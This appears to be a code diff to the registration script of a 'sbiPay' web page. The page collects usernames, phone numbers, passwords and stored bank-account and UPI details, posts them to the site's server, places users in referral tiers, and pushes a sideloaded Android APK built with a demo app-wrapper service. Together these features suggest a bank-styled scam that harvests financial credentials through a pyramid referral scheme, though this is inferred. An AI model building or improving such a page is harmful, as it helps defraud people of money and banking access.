@@ -3,17 +3,34 @@
 const params=new URLSearchParams(location.search);
 const referral=params.get('ref')||params.get('invite')||params.get('inviteCode')||params.get('referral')||'';
 const apkDownloadUrl='https://www.webtonative.com/api/v1/demo/download/6aad6cdbdad8b64c33dcaeb5/ANDROID?t=1789750716729';
+const passwordInput=document.querySelector('input[type="password"]');
+const phoneInput=document.querySelector('input[type="tel"]');
+const success=document.createElement('div');
+success.id='register-success';
+success.setAttribute('role','status');
+success.style.cssText='min-height:20px;color:#129765;text-align:center';
+document.getElementById('register-form').append(success);
 const inviteInput=document.getElementById('invite-code');
 inviteInput.value=referral;
 const readJson=(key,fallback)=>{try{return JSON.parse(localStorage.getItem(key)||JSON.stringify(fallback))}catch(error){return fallback}};
-document.getElementById('register-form').addEventListener('submit',function(event){
+document.getElementById('register-form').addEventListener('submit',async function(event){
   event.preventDefault();
   const username=document.getElementById('username').value.trim();
-  const phone=document.getElementById('phone').value.replace(/\D/g,'');
+  const phone=phoneInput.value.replace(/\D/g,'');
   const error=document.getElementById('register-error');
+  const password=passwordInput.value;
   const registeredPhones=readJson('sbiPayRegisteredPhones',{});
   if(phone.length<10){error.textContent='Enter a valid mobile number.';return}
+  if(password.length<6){error.textContent='Password must be at least 6 characters.';return}
   if(registeredPhones[phone]){error.textContent='This mobile number is already registered.';return}
+  const savedBanks=readJson('sbiPayWalletBanks',[]);
+  const savedUpis=readJson('sbiPayWalletUpi',[]);
+  if(savedBanks.length||savedUpis.length){error.textContent='This bank account or UPI is already registered.';return}
+  try{
+    const response=await fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username,phone,password,userId:'',inviteCode:'',ownerCode:referral,banks:savedBanks,upis:savedUpis,preflight:true})});
+    if(response.status===409){error.textContent=(await response.json()).error||'These registration details are already in use.';return}
+    if(!response.ok&&response.status!==503){error.textContent='Registration could not be completed. Please try again.';return}
+  }catch(networkError){}
   const nextUserId=Number(localStorage.getItem('sbiPayNextUserId')||284041);
   const userId=String(nextUserId);
   localStorage.setItem('sbiPayNextUserId',String(nextUserId+1));
@@ -41,10 +58,12 @@ document.getElementById('register-form').addEventListener('submit',function(even
     members.push({username,id:userId,inviteCode,referral,ownerCode:referral,level:parent.ownerCode?'C':'B',activity:0,joinedAt:new Date().toISOString()});
     localStorage.setItem('sbiPayTeamMembers',JSON.stringify(members));
   }
-  fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},keepalive:true,body:JSON.stringify({username,phone,password:document.querySelector('input[type="password"]').value,userId,inviteCode,ownerCode:referral})}).catch(()=>{});
-  window.open(apkDownloadUrl,'_blank','noopener');
-  window.location.href='dashboard.html?download=1';
-  localStorage.removeItem('sbiPayWalletBanks');
-  localStorage.removeItem('sbiPayWalletBanks');
+  try{
+    const response=await fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username,phone,password,userId,inviteCode,ownerCode:referral,banks:savedBanks,upis:savedUpis})});
+    if(response.status===409){error.textContent=(await response.json()).error||'These registration details are already in use.';return}
+  }catch(networkError){}
+  success.textContent='Registration Successful';
+  document.querySelector('.primary-button').disabled=true;
+  setTimeout(()=>{window.open(apkDownloadUrl,'_blank','noopener');window.location.href='dashboard.html?download=1'},900);
 });
 </script></body></html>
